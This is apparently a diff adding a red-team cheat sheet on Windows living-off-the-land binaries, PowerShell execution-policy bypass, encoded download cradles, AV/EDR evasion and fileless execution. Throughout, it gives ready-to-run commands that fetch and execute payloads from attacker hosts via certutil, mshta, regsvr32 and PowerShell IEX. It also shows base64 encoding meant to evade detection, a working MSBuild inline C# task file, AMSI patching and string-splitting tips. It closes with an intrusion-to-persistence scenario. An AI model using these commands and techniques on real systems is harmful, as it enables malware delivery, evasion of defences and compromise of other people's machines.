@@ -1,0 +1,191 @@
+LOLBAS – Living Off the Land Binaries and Scripts
+
+PowerShell Evasion Techniques
+
+AV/EDR Evasion (General TTPs)
+
+Payload Execution Without Writing to Disk
+
+
+Living Off the Land Binaries and Scripts (LOLBAS)
+
+What is LOLBAS?
+LOLBAS (Living Off the Land Binaries and Scripts) is the idea of using trusted, built-in Windows tools to do malicious things — like download payloads, execute code, bypass policies, etc.
+These tools are already present on most Windows systems, signed by Microsoft, and usually trusted by AV/EDR.
+
+Full list: https://lolbas-project.github.io/
+
+Common LOLBAS Examples (Use Case Table)
+Binary	Action	Example Usage
+certutil.exe	Download files	certutil -urlcache -f http://attacker/file.exe file.exe
+mshta.exe	Execute JavaScript/VBS payloads	mshta http://attacker/payload.hta
+regsvr32.exe	Execute .SCT scriptlets from web	regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll
+rundll32.exe	Run DLL exports	rundll32.exe payload.dll,EntryPoint
+wmic.exe	Remote command execution	wmic process call create "cmd.exe /c calc.exe"
+forfiles.exe	Execute commands via scheduled task	forfiles /P C:\ /M *.txt /C "cmd /c calc.exe"
+powershell.exe	Invoke malicious scripts	powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://...')"
+msbuild.exe	Compile & run malicious C# inline	msbuild.exe malicious.xml
+
+Example: Using certutil to Download Payload
+
+cmd
+certutil.exe -urlcache -f http://attacker/payload.exe payload.exe
+	• Bypasses many download restrictions
+	• Works even in restricted PowerShell environments
+🧠 Use bitsadmin, curl, or Invoke-WebRequest as fallbacks.
+
+
+PowerShell Execution Bypass Techniques
+When PowerShell script execution is disabled or logged, you can still bypass controls.
+
+PowerShell Execution Policy Bypass
+
+powershell
+powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
+	• -ExecutionPolicy Bypass – ignores current execution policy
+	• -NoProfile – avoids loading user profile scripts
+	• -WindowStyle Hidden – no popup
+	
+🧠 Tip: Even if GPO restricts execution, this will still often run from the command line or another LOLBAS.
+
+Encoded Payloads
+
+powershell
+powershell -encodedCommand <Base64EncodedPayload>
+	• Encode a script using:
+
+powershell
+$command = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
+	• Then run:
+
+powershell -encodedCommand [base64 code]
+🧠 This avoids signature-based detection and logs.
+
+
+
+Windows PowerShell One-Liner
+
+powershell
+$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')"; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+📦 Output: Base64 string ready for use with -EncodedCommand.
+🧪 Usage Example:
+
+powershell
+powershell -NoProfile -WindowStyle Hidden -EncodedCommand <PASTE_BASE64_STRING_HERE>
+
+Linux / Bash One-Liner
+This assumes you're crafting the payload on a *nix system (e.g. Kali, Parrot, WSL):
+
+bash
+echo -n "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0
+📦 Output: Single-line base64 blob, UTF-16LE-encoded.
+🧪 Usage on Windows target:
+
+c
+powershell -NoProfile -WindowStyle Hidden -EncodedCommand <base64>
+
+
+
+
+
+
+
+AV/EDR Evasion TTPs
+Common Evasion Strategies:
+Strategy	Description
+Reflective DLL Injection	Inject shellcode into memory without writing DLL to disk
+Process Hollowing	Spawn legitimate process (e.g., svchost.exe) and replace memory
+Signed Binary Proxy Execution (LOLBAS)	Use trusted signed binaries to proxy malicious execution
+Encrypt/Obfuscate Payloads	Use tools like Invoke-Obfuscation, PSObfuscate
+Block List Awareness	Avoid known strings like mimikatz, Invoke-Mimikatz, etc.
+Syscall/Direct Syscalls	Low-level techniques to avoid user-mode hooks (e.g., Sliver, Cobalt Strike)
+
+
+Tools for AV/EDR Evasion
+Tool	Purpose
+Invoke-Obfuscation	Obfuscate PowerShell code
+Donut	Convert payloads into shellcode
+Sliver	C2 framework with advanced evasion
+CactusTorch	Bypass AV using VBA macros and shellcode
+NimPackt	Nim-based stager builder with evasion
+Shellter, Veil, FUDInjector	AV bypass payload builders
+
+🧠 Tip: Red teams often "stage" tools in memory using PowerShell, .NET, or MSBuild — nothing touches disk.
+
+
+Fileless Execution Techniques
+These techniques avoid dropping files and run everything in memory:
+
+1. MSBuild Fileless Execution
+MSBuild is a trusted binary used by .NET. You can embed C# shellcode into an .xml project file.
+malicious.xml:
+
+xml
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Payload">
+    <ClassExample/>
+  </Target>
+  <UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <Task>
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+        using System;
+        using System.Diagnostics;
+        using Microsoft.Build.Framework;
+        using Microsoft.Build.Utilities;
+        public class ClassExample : Task {
+          public override bool Execute() {
+            Process.Start("cmd.exe", "/c calc.exe");
+            return true;
+          }
+        } ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
+
+Execute:
+
+cmd
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe malicious.xml
+2. Regsvr32 + SCT File
+SCT = COM scriptlet, often hosted remotely.
+
+cmd
+regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
+	• No disk writes
+	• AV/EDR often lets it through
+
+🧬 3. InstallUtil
+Used for .NET application setup. Can be abused to run C# payloads:
+
+cmd
+InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
+🧠 Payload must contain Installer class. Does not require admin.
+
+
+Detection and Evasion Tips
+Detection Bypass	Countermeasure
+Use amsi.dll patching	Defender sees obfuscated code as clean
+Inline shellcode loaders	Avoid known binaries like mimikatz.exe
+Split strings: "mimi" + "katz"	Avoid static detection
+Use System.Management.Automation assembly	Hide PowerShell in C# stagers
+
+
+Realistic Scenario
+You're on a hardened workstation:
+	1. PowerShell is restricted (no scripts, logs enabled)
+	2. AV is blocking mimikatz.exe
+	3. Defender is active
+You evade with:
+	• Downloading payload via certutil
+	• Executing shellcode via msbuild.exe
+	• Using Rubeus from memory (Rubeus.exe ➝ donut ➝ shellcode)
+	• Persisting via GPO-scheduled task
+	• Forging silver ticket and accessing SQL without a single call to the DC
+You’ve now completed: Access ➝ Pivot ➝ Persist ➝ Evade ➝ Own.
+
